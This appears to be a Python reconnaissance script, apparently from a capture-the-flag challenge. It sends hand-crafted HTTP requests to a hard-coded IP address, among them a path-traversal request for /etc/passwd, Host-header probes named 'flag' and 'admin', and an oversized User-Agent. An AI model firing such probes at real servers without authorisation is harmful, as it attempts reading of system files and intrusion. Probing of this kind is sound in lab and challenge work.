import socket, time

def raw(host, port, req, timeout=10):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req)
    buf = b""
    s.settimeout(timeout)
    t0 = time.time()
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            buf += c
    except socket.timeout:
        buf += b"<TIMEOUT>"
    s.close()
    return buf, time.time() - t0

cases = {
    "http10": b"GET / HTTP/1.0\r\n\r\n",
    "host-egg": b"GET / HTTP/1.1\r\nHost: egg\r\nConnection: close\r\n\r\n",
    "host-localhost": b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n",
    "host-flag": b"GET / HTTP/1.1\r\nHost: flag\r\nConnection: close\r\n\r\n",
    "ws-upgrade": b"GET / HTTP/1.1\r\nHost: 52.76.96.108:3012\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
    "host-admin": b"GET / HTTP/1.1\r\nHost: admin.egg\r\nConnection: close\r\n\r\n",
    "path-trav": b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: 52.76.96.108:3012\r\nConnection: close\r\n\r\n",
    "favicon": b"GET /favicon.ico HTTP/1.1\r\nHost: 52.76.96.108:3012\r\nConnection: close\r\n\r\n",
    "index-php": b"GET /index.php HTTP/1.1\r\nHost: 52.76.96.108:3012\r\nConnection: close\r\n\r\n",
    "big-ua": b"GET / HTTP/1.1\r\nHost: 52.76.96.108:3012\r\nUser-Agent: " + b"A"*8000 + b"\r\nConnection: close\r\n\r\n",
}
for name, req in cases.items():
    data, dt = raw("52.76.96.108", 3012, req)
    print(f"=== {name} (t={dt:.2f}s, len={len(data)}) ===")
    print(repr(data[:500]))
    print()
